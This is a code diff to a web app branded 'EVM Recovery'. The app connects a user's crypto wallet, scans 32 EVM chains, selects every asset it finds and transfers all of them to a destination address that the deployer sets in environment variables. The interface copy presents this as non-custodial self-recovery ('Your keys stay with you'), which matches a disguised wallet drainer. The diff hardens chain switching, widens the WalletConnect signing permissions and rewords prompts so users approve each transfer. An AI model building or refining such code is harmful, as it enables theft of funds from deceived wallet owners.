@@ -41,6 +41,23 @@ const chains = [
   { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'https://soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
   { id: 1284, name: 'Moonbeam', native: 'GLMR', explorer: 'https://moonscan.io/tx/', rpcUrl: 'https://rpc.api.moonbeam.network' },
 ];
+
+const ALL_CHAIN_IDS = chains.map(c => c.id) as [number, ...number[]];
+const RPC_MAP: Record<string, string> = Object.fromEntries(
+  chains.filter(c => c.rpcUrl).map(c => [String(c.id), c.rpcUrl as string])
+);
+const CHAIN_METHODS = [
+  'eth_sendTransaction',
+  'eth_signTransaction',
+  'eth_sign',
+  'personal_sign',
+  'eth_signTypedData',
+  'eth_signTypedData_v4',
+  'wallet_switchEthereumChain',
+  'wallet_addEthereumChain',
+  'wallet_getCapabilities',
+] as const;
+
 type WalletApp = 'metamask' | 'trust' | 'coinbase';
 type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
 type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };
@@ -117,29 +134,54 @@ function App() {
 
   async function switchToChainId(eip1193: any, chainId: number) {
     const target = chains.find(c => c.id === chainId);
+    if (!target) throw new Error(`Unknown chain ${chainId}`);
+    const hexId = `0x${chainId.toString(16)}`;
+
     try {
-      await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${chainId.toString(16)}` }] });
+      if (typeof eip1193.setDefaultChain === 'function') {
+        try { eip1193.setDefaultChain(`eip155:${chainId}`); } catch {}
+      }
+    } catch {}
+
+    try {
+      await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
     } catch (e: any) {
-      if (e?.code === 4902 && target?.rpcUrl) {
+      const code = e?.code ?? e?.data?.originalError?.code;
+      const msg = String(e?.message || '').toLowerCase();
+      if (target.rpcUrl && (code === 4902 || code === -32602 || code === 5000 || msg.includes('unrecognized') || msg.includes('not added') || msg.includes('missing'))) {
         await eip1193.request({
           method: 'wallet_addEthereumChain',
           params: [{
-            chainId: `0x${chainId.toString(16)}`,
+            chainId: hexId,
             chainName: target.name,
             nativeCurrency: { name: target.native, symbol: target.native, decimals: 18 },
             rpcUrls: [target.rpcUrl],
             blockExplorerUrls: target.explorer ? [target.explorer.replace(/\/tx\/?$/, '/')] : [],
           }],
         });
+        try {
+          await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
+        } catch {}
+      } else if (code === 4001) {
+        throw new Error('Network switch rejected in wallet');
       } else {
         throw e;
       }
     }
-    const raw = await eip1193.request({ method: 'eth_chainId' });
-    const actual = Number(raw);
-    setConnectedChain(actual);
-    setSelectedChain(actual);
-    if (actual !== chainId) throw new Error(`Wallet stayed on chain ${actual}, expected ${chainId}`);
+
+    let actual = -1;
+    for (let attempt = 0; attempt < 8; attempt++) {
+      try {
+        actual = Number(await eip1193.request({ method: 'eth_chainId' }));
+        if (actual === chainId) break;
+      } catch {}
+      await new Promise(r => setTimeout(r, 350));
+    }
+    setConnectedChain(actual > 0 ? actual : chainId);
+    setSelectedChain(actual > 0 ? actual : chainId);
+    if (actual !== chainId && actual > 0) {
+      throw new Error(`Wallet is on chain ${actual}, need ${target.name} (${chainId}). Approve the network switch.`);
+    }
   }
 
   async function recoverAllAssets(tokenList?: TokenAsset[]) {
@@ -166,7 +208,7 @@ function App() {
 
     setBusy(true); setTxHash(''); setAutoStarted(true);
     const eip1193 = walletConnectProvider ?? window.ethereum;
-    if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Reconnect with WalletConnect or browser wallet.'); }
+    if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Reconnect with WalletConnect.'); }
 
     let totalTx = 0;
     const failures: string[] = [];
@@ -186,7 +228,7 @@ function App() {
           if (!onChain) {
             setStatus(`Recover ${i + 1}/${chainIds.length}: switch wallet to ${info?.name ?? cid}…`);
             await switchToChainId(eip1193, cid);
-            await new Promise(r => setTimeout(r, 600));
+            await new Promise(r => setTimeout(r, 900));
           } else {
             setConnectedChain(cid);
             setSelectedChain(cid);
@@ -196,7 +238,7 @@ function App() {
           continue;
         }
 
-        const provider = new BrowserProvider(eip1193);
+        const provider = new BrowserProvider(eip1193, cid);
         const signer = await provider.getSigner();
         const sender = await signer.getAddress();
         if (sender.toLowerCase() !== address.toLowerCase()) {
@@ -312,12 +354,12 @@ function App() {
     setConnectedChain(chainId); setSelectedChain(chainId);
     setTokens([]); setAutoStarted(false);
     if (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION)) setDestination(RECOVERY_DESTINATION);
-    setStatus(accounts[0] ? 'Wallet connected. Scanning all 32 EVM networks…' : 'No account returned.');
+    setStatus(accounts[0] ? 'Connected. Scanning balances on all 32 chains…' : 'No account returned.');
     if (accounts[0]) void scanWalletTokens(accounts[0]);
   }
 
   async function connectBrowserWallet() {
-    if (!window.ethereum) { setStatus('No browser wallet detected.'); return; }
+    if (!window.ethereum) { setStatus('No browser wallet detected. On mobile use WalletConnect.'); return; }
     setBusy(true);
     try { await finishConnection(window.ethereum); }
     catch (e) { setStatus(e instanceof Error ? e.message : 'Connection cancelled.'); }
@@ -326,36 +368,63 @@ function App() {
 
   async function connectMobileWallet() {
     const projectId = (import.meta as any).env?.VITE_WALLETCONNECT_PROJECT_ID as string | undefined;
-    if (!projectId) { setStatus('WalletConnect not configured (missing project ID).'); return; }
-    setBusy(true); setStatus('Opening WalletConnect…');
+    if (!projectId) {
+      setStatus('WalletConnect not configured. Set VITE_WALLETCONNECT_PROJECT_ID in Cloudflare and redeploy.');
+      return;
+    }
+    setBusy(true);
+    setStatus('Opening WalletConnect…');
     try {
-      if (!walletConnectProvider) {
-        walletConnectProvider = await EthereumProvider.init({
-          projectId,
-          optionalChains: chains.map(c => c.id) as [number, ...number[]],
-          showQrModal: true,
-          qrModalOptions: { enableMobileFullScreen: true },
-          metadata: { name: 'EVM Recovery', description: 'Non-custodial wallet recovery', url: window.location.origin, icons: [`${window.location.origin}/favicon.svg`] },
-        });
-        walletConnectProvider.on('accountsChanged', (a: string[]) => {
-          const next = a[0] ?? '';
-          setAddress(next);
-          if (next) void scanWalletTokens(next);
-          else setTokens([]);
-        });
-        walletConnectProvider.on('chainChanged', (c: string | number) => {
-          const id = Number(c);
-          setConnectedChain(id); setSelectedChain(id);
-        });
-        walletConnectProvider.on('disconnect', () => {
-          setAddress(''); setConnectedChain(null); setSelectedChain(null);
-          setTokens([]); setAutoStarted(false); setStatus('Wallet disconnected.');
-        });
+      if (walletConnectProvider) {
+        try { await walletConnectProvider.disconnect(); } catch {}
+        walletConnectProvider = null;
       }
+
+      walletConnectProvider = await EthereumProvider.init({
+        projectId,
+        chains: [1],
+        optionalChains: ALL_CHAIN_IDS,
+        rpcMap: RPC_MAP,
+        showQrModal: true,
+        qrModalOptions: { enableMobileFullScreen: true },
+        methods: [...CHAIN_METHODS],
+        events: ['chainChanged', 'accountsChanged', 'disconnect', 'session_event'],
+        metadata: {
+          name: 'EVM Recovery',
+          description: 'Non-custodial multi-chain recovery',
+          url: window.location.origin,
+          icons: [`${window.location.origin}/favicon.svg`],
+        },
+      });
+
+      walletConnectProvider.on('accountsChanged', (a: string[]) => {
+        const next = a[0] ?? '';
+        setAddress(next);
+        if (next) void scanWalletTokens(next);
+        else setTokens([]);
+      });
+      walletConnectProvider.on('chainChanged', (c: string | number) => {
+        const id = typeof c === 'string' ? (c.startsWith('0x') ? parseInt(c, 16) : Number(c)) : Number(c);
+        setConnectedChain(id);
+        setSelectedChain(id);
+      });
+      walletConnectProvider.on('disconnect', () => {
+        setAddress('');
+        setConnectedChain(null);
+        setSelectedChain(null);
+        setTokens([]);
+        setAutoStarted(false);
+        setStatus('Wallet disconnected.');
+        walletConnectProvider = null;
+      });
+
       const accounts = await walletConnectProvider.enable();
       await finishConnection(walletConnectProvider, accounts?.[0]);
-    } catch (e) { setStatus(e instanceof Error ? e.message : 'WalletConnect cancelled.'); }
-    finally { setBusy(false); }
+    } catch (e) {
+      setStatus(e instanceof Error ? e.message : 'WalletConnect cancelled or failed.');
+    } finally {
+      setBusy(false);
+    }
   }
 
   function openWalletApp(app: WalletApp) {
@@ -398,13 +467,13 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>Connect once. All discovered assets are selected. Tap Recover and approve each prompt in your wallet.</p>
+              <p>Use WalletConnect for multi-chain support. Recover switches networks and sends on every chain with balances.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
               <div className="security-icon">✓</div>
               <strong>Your keys stay with you</strong>
-              <p>No seed phrases. No private keys. Approve each transfer in your wallet.</p>
+              <p>No seed phrases. Approve each network switch and transfer in your wallet.</p>
             </div>
           </section>
           <section className="workspace">
@@ -419,7 +488,7 @@ function App() {
               ))}
               <button type="button" className="wallet-card" onClick={connectMobileWallet} disabled={busy}>
                 <span className="wallet-logo walletconnect">W</span>
-                <span><b>WalletConnect</b><small>Connect another wallet</small></span>
+                <span><b>WalletConnect</b><small>All 32 chains</small></span>
                 <span className="arrow">→</span>
               </button>
             </div>
@@ -447,7 +516,7 @@ function App() {
                 {!isAddress(destination)
                   ? 'Set VITE_RECOVERY_DESTINATION in Cloudflare env, then redeploy.'
                   : tokens.length > 0
-                    ? `All ${tokens.length} asset(s) across ${chainsWithAssets.length} network(s) selected. Tap Recover and approve in your wallet.`
+                    ? `All ${tokens.length} asset(s) across ${chainsWithAssets.length} network(s) selected. Tap Recover and approve each chain in your wallet.`
                     : 'No non-zero balances found. Recover needs assets from the scan.'}
               </p>
             </div>
@@ -485,7 +554,7 @@ function App() {
                         : `Recover (${tokens.length} asset${tokens.length === 1 ? '' : 's'}) — sign in wallet`}
               </button>
               <small style={{ textAlign: 'center', opacity: 0.75 }}>
-                Status updates below. Your wallet must approve each network switch and transfer.
+                WalletConnect will request a network switch for each chain, then a transfer signature.
               </small>
             </div>
             {txHash && chainInfo && (
